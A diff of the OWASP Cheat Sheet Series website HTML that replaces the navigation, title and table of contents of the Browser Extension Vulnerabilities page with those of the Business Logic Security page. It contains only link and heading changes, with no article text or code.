@@ -10,13 +10,13 @@
       
       
       
-        <link rel="canonical" href="https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html">
+        <link rel="canonical" href="https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html">
       
       
-        <link rel="prev" href="Bean_Validation_Cheat_Sheet.html">
+        <link rel="prev" href="Browser_Extension_Vulnerabilities_Cheat_Sheet.html">
       
       
-        <link rel="next" href="Business_Logic_Security_Cheat_Sheet.html">
+        <link rel="next" href="C-Based_Toolchain_Hardening_Cheat_Sheet.html">
       
       
       <link rel="icon" href="../assets/WebSite_Favicon.png">
@@ -24,7 +24,7 @@
     
     
       
-        <title>Browser Extension Vulnerabilities - OWASP Cheat Sheet Series</title>
+        <title>Business Logic Security - OWASP Cheat Sheet Series</title>
       
     
     
@@ -76,7 +76,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#browser-extension-security-vulnerabilities-cheat-sheet" class="md-skip">
+        <a href="#business-logic-security-cheat-sheet" class="md-skip">
           Skip to content
         </a>
       
@@ -111,7 +111,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Browser Extension Vulnerabilities
+              Business Logic Security
             
           </span>
         </div>
@@ -622,6 +622,27 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="Browser_Extension_Vulnerabilities_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Browser Extension Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -638,18 +659,18 @@
           
   
   <span class="md-ellipsis">
-    Browser Extension Vulnerabilities
+    Business Logic Security
   </span>
   
 
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <a href="Browser_Extension_Vulnerabilities_Cheat_Sheet.html" class="md-nav__link md-nav__link--active">
+      <a href="Business_Logic_Security_Cheat_Sheet.html" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
-    Browser Extension Vulnerabilities
+    Business Logic Security
   </span>
   
 
@@ -671,37 +692,55 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#1-permissions-overreach" class="md-nav__link">
+  <a href="#introduction" class="md-nav__link">
     <span class="md-ellipsis">
-      1. Permissions Overreach
+      Introduction
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="1. Permissions Overreach">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#why-business-logic-flaws-are-different" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why Business Logic Flaws Are Different
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#always-re-derive-security-relevant-values-server-side" class="md-nav__link">
+    <span class="md-ellipsis">
+      Always Re-derive Security-relevant Values Server-side
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Always Re-derive Security-relevant Values Server-side">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-permissions-overreach" class="md-nav__link">
+  <a href="#prices-and-totals" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Permissions Overreach
+      Prices and Totals
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-permissions-overreach" class="md-nav__link">
+  <a href="#permissions-and-ownership" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Permissions Overreach
+      Permissions and Ownership
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-permissions-overreach" class="md-nav__link">
+  <a href="#identity-and-role" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Permissions Overreach
+      Identity and Role
     </span>
   </a>
   
@@ -713,37 +752,46 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#2-data-leakage" class="md-nav__link">
+  <a href="#enforce-workflows-as-explicit-state-machines" class="md-nav__link">
     <span class="md-ellipsis">
-      2. Data Leakage
+      Enforce Workflows as Explicit State Machines
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="2. Data Leakage">
+    <nav class="md-nav" aria-label="Enforce Workflows as Explicit State Machines">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-data-leakage" class="md-nav__link">
+  <a href="#model-state-on-the-server" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Data Leakage
+      Model State on the Server
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-data-leakage" class="md-nav__link">
+  <a href="#dont-use-hidden-form-fields-as-state" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Data Leakage
+      Don't Use Hidden Form Fields as State
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-data-leakage" class="md-nav__link">
+  <a href="#reject-replays-of-completed-steps" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Data Leakage
+      Reject Replays of Completed Steps
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#expire-partial-states" class="md-nav__link">
+    <span class="md-ellipsis">
+      Expire Partial States
     </span>
   </a>
   
@@ -755,37 +803,55 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#3-cross-site-scripting-xss" class="md-nav__link">
+  <a href="#prevent-race-conditions-on-sensitive-operations" class="md-nav__link">
     <span class="md-ellipsis">
-      3. Cross-Site Scripting (XSS)
+      Prevent Race Conditions on Sensitive Operations
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="3. Cross-Site Scripting (XSS)">
+    <nav class="md-nav" aria-label="Prevent Race Conditions on Sensitive Operations">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-cross-site-scripting-xss" class="md-nav__link">
+  <a href="#identify-the-critical-sections" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Cross-Site Scripting (XSS)
+      Identify the Critical Sections
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-cross-site-scripting-xss" class="md-nav__link">
+  <a href="#use-database-transactions-and-locks" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Cross-Site Scripting (XSS)
+      Use Database Transactions and Locks
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-cross-site-scripting-xss" class="md-nav__link">
+  <a href="#use-idempotency-keys-for-external-actions" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Cross-Site Scripting (XSS)
+      Use Idempotency Keys for External Actions
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dont-assume-fast-enough" class="md-nav__link">
+    <span class="md-ellipsis">
+      Don't Assume "Fast Enough"
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pattern-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pattern Reference
     </span>
   </a>
   
@@ -797,37 +863,28 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#4-insecure-communication" class="md-nav__link">
+  <a href="#protect-abuse-friendly-features" class="md-nav__link">
     <span class="md-ellipsis">
-      4. Insecure Communication
+      Protect Abuse-friendly Features
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="4. Insecure Communication">
+    <nav class="md-nav" aria-label="Protect Abuse-friendly Features">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-insecure-communication" class="md-nav__link">
+  <a href="#abuse-patterns-to-design-against" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Insecure Communication
+      Abuse Patterns to Design Against
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-insecure-communication" class="md-nav__link">
+  <a href="#controls-to-apply" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Insecure Communication
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#mitigation-insecure-communication" class="md-nav__link">
-    <span class="md-ellipsis">
-      Mitigation: Insecure Communication
+      Controls to Apply
     </span>
   </a>
   
@@ -839,37 +896,37 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#5-code-injection" class="md-nav__link">
+  <a href="#threat-model-from-the-business-process" class="md-nav__link">
     <span class="md-ellipsis">
-      5. Code Injection
+      Threat Model from the Business Process
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="5. Code Injection">
+    <nav class="md-nav" aria-label="Threat Model from the Business Process">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-code-injection" class="md-nav__link">
+  <a href="#questions-to-ask-early" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Code Injection
+      Questions to Ask Early
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-code-injection" class="md-nav__link">
+  <a href="#the-dishonest-user-exercise" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Code Injection
+      The "Dishonest User" Exercise
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-code-injection" class="md-nav__link">
+  <a href="#write-down-the-invariants" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Code Injection
+      Write Down the Invariants
     </span>
   </a>
   
@@ -881,37 +938,37 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#6-malicious-updates" class="md-nav__link">
+  <a href="#authorization-at-the-business-logic-layer" class="md-nav__link">
     <span class="md-ellipsis">
-      6. Malicious Updates
+      Authorization at the Business-logic Layer
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="6. Malicious Updates">
+    <nav class="md-nav" aria-label="Authorization at the Business-logic Layer">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-malicious-updates" class="md-nav__link">
+  <a href="#contextual-authorization" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Malicious Updates
+      Contextual Authorization
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-malicious-updates" class="md-nav__link">
+  <a href="#avoid-implicit-permissions" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Malicious Updates
+      Avoid "Implicit" Permissions
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-malicious-updates" class="md-nav__link">
+  <a href="#reference-related-guidance" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Malicious Updates
+      Reference Related Guidance
     </span>
   </a>
   
@@ -923,37 +980,37 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#7-third-party-dependencies" class="md-nav__link">
+  <a href="#validate-inputs-for-business-meaning-not-just-format" class="md-nav__link">
     <span class="md-ellipsis">
-      7. Third-Party Dependencies
+      Validate Inputs for Business Meaning, Not Just Format
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="7. Third-Party Dependencies">
+    <nav class="md-nav" aria-label="Validate Inputs for Business Meaning, Not Just Format">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-third-party-dependencies" class="md-nav__link">
+  <a href="#validate-ranges" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Third-Party Dependencies
+      Validate Ranges
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-third-party-dependencies" class="md-nav__link">
+  <a href="#validate-combinations" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Third-Party Dependencies
+      Validate Combinations
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-third-party-dependencies" class="md-nav__link">
+  <a href="#dont-trust-derived-or-hidden-fields" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Third-Party Dependencies
+      Don't Trust Derived or Hidden Fields
     </span>
   </a>
   
@@ -965,37 +1022,37 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#8-lack-of-content-security-policy-csp" class="md-nav__link">
+  <a href="#observability-and-anomaly-detection" class="md-nav__link">
     <span class="md-ellipsis">
-      8. Lack of Content Security Policy (CSP)
+      Observability and Anomaly Detection
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="8. Lack of Content Security Policy (CSP)">
+    <nav class="md-nav" aria-label="Observability and Anomaly Detection">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-lack-of-content-security-policy-csp" class="md-nav__link">
+  <a href="#what-to-log" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Lack of Content Security Policy (CSP)
+      What to Log
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-lack-of-content-security-policy-csp" class="md-nav__link">
+  <a href="#what-to-alert-on" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Lack of Content Security Policy (CSP)
+      What to Alert On
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-lack-of-content-security-policy-csp" class="md-nav__link">
+  <a href="#close-the-loop" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Lack of Content Security Policy (CSP)
+      Close the Loop
     </span>
   </a>
   
@@ -1007,37 +1064,46 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#9-insecure-storage" class="md-nav__link">
+  <a href="#testing-business-logic" class="md-nav__link">
     <span class="md-ellipsis">
-      9. Insecure Storage
+      Testing Business Logic
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="9. Insecure Storage">
+    <nav class="md-nav" aria-label="Testing Business Logic">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-insecure-storage" class="md-nav__link">
+  <a href="#test-the-rules-not-the-implementation" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Insecure Storage
+      Test the Rules, Not the Implementation
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-insecure-storage" class="md-nav__link">
+  <a href="#test-concurrency" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Insecure Storage
+      Test Concurrency
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-insecure-storage" class="md-nav__link">
+  <a href="#test-ordering" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Insecure Storage
+      Test Ordering
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#test-with-an-adversarial-mindset" class="md-nav__link">
+    <span class="md-ellipsis">
+      Test with an Adversarial Mindset
     </span>
   </a>
   
@@ -1049,37 +1115,55 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#10-insufficient-privacy-controls" class="md-nav__link">
+  <a href="#common-examples-of-business-logic-flaws" class="md-nav__link">
     <span class="md-ellipsis">
-      10. Insufficient Privacy Controls
+      Common Examples of Business Logic Flaws
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="10. Insufficient Privacy Controls">
+    <nav class="md-nav" aria-label="Common Examples of Business Logic Flaws">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-insufficient-privacy-controls" class="md-nav__link">
+  <a href="#price-and-quantity" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Insufficient Privacy Controls
+      Price and Quantity
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-insufficient-privacy-controls" class="md-nav__link">
+  <a href="#workflow" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Insufficient Privacy Controls
+      Workflow
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-insufficient-privacy-controls" class="md-nav__link">
+  <a href="#concurrency" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Insufficient Privacy Controls
+      Concurrency
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authorization-in-disguise" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authorization-in-disguise
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#value-dispensing-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      Value-dispensing Abuse
     </span>
   </a>
   
@@ -1091,135 +1175,18 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#11-dom-based-data-skimming" class="md-nav__link">
+  <a href="#summary-checklist" class="md-nav__link">
     <span class="md-ellipsis">
-      11. DOM-based Data Skimming
+      Summary Checklist
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="11. DOM-based Data Skimming">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#vulnerability-dom-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Vulnerability: DOM-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#example-dom-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Example: DOM-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#mitigation-dom-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Mitigation: DOM-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#12-prototype-based-data-skimming" class="md-nav__link">
+  <a href="#references" class="md-nav__link">
     <span class="md-ellipsis">
-      12. Prototype-based Data Skimming
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="12. Prototype-based Data Skimming">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#vulnerability-prototype-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Vulnerability: Prototype-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#example-prototype-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Example: Prototype-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#mitigation-prototype-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Mitigation: Prototype-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#13-insecure-message-passing" class="md-nav__link">
-    <span class="md-ellipsis">
-      13. Insecure Message Passing
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="13. Insecure Message Passing">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#vulnerability-insecure-message-passing" class="md-nav__link">
-    <span class="md-ellipsis">
-      Vulnerability: Insecure Message Passing
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#example-insecure-message-passing" class="md-nav__link">
-    <span class="md-ellipsis">
-      Example: Insecure Message Passing
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#mitigation-insecure-message-passing" class="md-nav__link">
-    <span class="md-ellipsis">
-      Mitigation: Insecure Message Passing
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
-    <span class="md-ellipsis">
-      Conclusion
+      References
     </span>
   </a>
   
@@ -1229,27 +1196,6 @@
   
 </nav>
       
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="Business_Logic_Security_Cheat_Sheet.html" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Business Logic Security
-  </span>
-  
-
-      </a>
     </li>
   
 
@@ -3431,37 +3377,55 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#1-permissions-overreach" class="md-nav__link">
+  <a href="#introduction" class="md-nav__link">
     <span class="md-ellipsis">
-      1. Permissions Overreach
+      Introduction
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="1. Permissions Overreach">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#why-business-logic-flaws-are-different" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why Business Logic Flaws Are Different
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#always-re-derive-security-relevant-values-server-side" class="md-nav__link">
+    <span class="md-ellipsis">
+      Always Re-derive Security-relevant Values Server-side
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Always Re-derive Security-relevant Values Server-side">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-permissions-overreach" class="md-nav__link">
+  <a href="#prices-and-totals" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Permissions Overreach
+      Prices and Totals
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-permissions-overreach" class="md-nav__link">
+  <a href="#permissions-and-ownership" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Permissions Overreach
+      Permissions and Ownership
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-permissions-overreach" class="md-nav__link">
+  <a href="#identity-and-role" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Permissions Overreach
+      Identity and Role
     </span>
   </a>
   
@@ -3473,37 +3437,46 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#2-data-leakage" class="md-nav__link">
+  <a href="#enforce-workflows-as-explicit-state-machines" class="md-nav__link">
     <span class="md-ellipsis">
-      2. Data Leakage
+      Enforce Workflows as Explicit State Machines
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="2. Data Leakage">
+    <nav class="md-nav" aria-label="Enforce Workflows as Explicit State Machines">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-data-leakage" class="md-nav__link">
+  <a href="#model-state-on-the-server" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Data Leakage
+      Model State on the Server
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-data-leakage" class="md-nav__link">
+  <a href="#dont-use-hidden-form-fields-as-state" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Data Leakage
+      Don't Use Hidden Form Fields as State
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-data-leakage" class="md-nav__link">
+  <a href="#reject-replays-of-completed-steps" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Data Leakage
+      Reject Replays of Completed Steps
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#expire-partial-states" class="md-nav__link">
+    <span class="md-ellipsis">
+      Expire Partial States
     </span>
   </a>
   
@@ -3515,37 +3488,55 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#3-cross-site-scripting-xss" class="md-nav__link">
+  <a href="#prevent-race-conditions-on-sensitive-operations" class="md-nav__link">
     <span class="md-ellipsis">
-      3. Cross-Site Scripting (XSS)
+      Prevent Race Conditions on Sensitive Operations
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="3. Cross-Site Scripting (XSS)">
+    <nav class="md-nav" aria-label="Prevent Race Conditions on Sensitive Operations">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-cross-site-scripting-xss" class="md-nav__link">
+  <a href="#identify-the-critical-sections" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Cross-Site Scripting (XSS)
+      Identify the Critical Sections
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-cross-site-scripting-xss" class="md-nav__link">
+  <a href="#use-database-transactions-and-locks" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Cross-Site Scripting (XSS)
+      Use Database Transactions and Locks
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-cross-site-scripting-xss" class="md-nav__link">
+  <a href="#use-idempotency-keys-for-external-actions" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Cross-Site Scripting (XSS)
+      Use Idempotency Keys for External Actions
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dont-assume-fast-enough" class="md-nav__link">
+    <span class="md-ellipsis">
+      Don't Assume "Fast Enough"
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pattern-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pattern Reference
     </span>
   </a>
   
@@ -3557,37 +3548,28 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#4-insecure-communication" class="md-nav__link">
+  <a href="#protect-abuse-friendly-features" class="md-nav__link">
     <span class="md-ellipsis">
-      4. Insecure Communication
+      Protect Abuse-friendly Features
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="4. Insecure Communication">
+    <nav class="md-nav" aria-label="Protect Abuse-friendly Features">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-insecure-communication" class="md-nav__link">
+  <a href="#abuse-patterns-to-design-against" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Insecure Communication
+      Abuse Patterns to Design Against
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-insecure-communication" class="md-nav__link">
+  <a href="#controls-to-apply" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Insecure Communication
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#mitigation-insecure-communication" class="md-nav__link">
-    <span class="md-ellipsis">
-      Mitigation: Insecure Communication
+      Controls to Apply
     </span>
   </a>
   
@@ -3599,37 +3581,37 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#5-code-injection" class="md-nav__link">
+  <a href="#threat-model-from-the-business-process" class="md-nav__link">
     <span class="md-ellipsis">
-      5. Code Injection
+      Threat Model from the Business Process
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="5. Code Injection">
+    <nav class="md-nav" aria-label="Threat Model from the Business Process">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-code-injection" class="md-nav__link">
+  <a href="#questions-to-ask-early" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Code Injection
+      Questions to Ask Early
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-code-injection" class="md-nav__link">
+  <a href="#the-dishonest-user-exercise" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Code Injection
+      The "Dishonest User" Exercise
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-code-injection" class="md-nav__link">
+  <a href="#write-down-the-invariants" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Code Injection
+      Write Down the Invariants
     </span>
   </a>
   
@@ -3641,37 +3623,37 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#6-malicious-updates" class="md-nav__link">
+  <a href="#authorization-at-the-business-logic-layer" class="md-nav__link">
     <span class="md-ellipsis">
-      6. Malicious Updates
+      Authorization at the Business-logic Layer
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="6. Malicious Updates">
+    <nav class="md-nav" aria-label="Authorization at the Business-logic Layer">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-malicious-updates" class="md-nav__link">
+  <a href="#contextual-authorization" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Malicious Updates
+      Contextual Authorization
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-malicious-updates" class="md-nav__link">
+  <a href="#avoid-implicit-permissions" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Malicious Updates
+      Avoid "Implicit" Permissions
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-malicious-updates" class="md-nav__link">
+  <a href="#reference-related-guidance" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Malicious Updates
+      Reference Related Guidance
     </span>
   </a>
   
@@ -3683,37 +3665,37 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#7-third-party-dependencies" class="md-nav__link">
+  <a href="#validate-inputs-for-business-meaning-not-just-format" class="md-nav__link">
     <span class="md-ellipsis">
-      7. Third-Party Dependencies
+      Validate Inputs for Business Meaning, Not Just Format
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="7. Third-Party Dependencies">
+    <nav class="md-nav" aria-label="Validate Inputs for Business Meaning, Not Just Format">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-third-party-dependencies" class="md-nav__link">
+  <a href="#validate-ranges" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Third-Party Dependencies
+      Validate Ranges
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-third-party-dependencies" class="md-nav__link">
+  <a href="#validate-combinations" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Third-Party Dependencies
+      Validate Combinations
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-third-party-dependencies" class="md-nav__link">
+  <a href="#dont-trust-derived-or-hidden-fields" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Third-Party Dependencies
+      Don't Trust Derived or Hidden Fields
     </span>
   </a>
   
@@ -3725,37 +3707,37 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#8-lack-of-content-security-policy-csp" class="md-nav__link">
+  <a href="#observability-and-anomaly-detection" class="md-nav__link">
     <span class="md-ellipsis">
-      8. Lack of Content Security Policy (CSP)
+      Observability and Anomaly Detection
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="8. Lack of Content Security Policy (CSP)">
+    <nav class="md-nav" aria-label="Observability and Anomaly Detection">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-lack-of-content-security-policy-csp" class="md-nav__link">
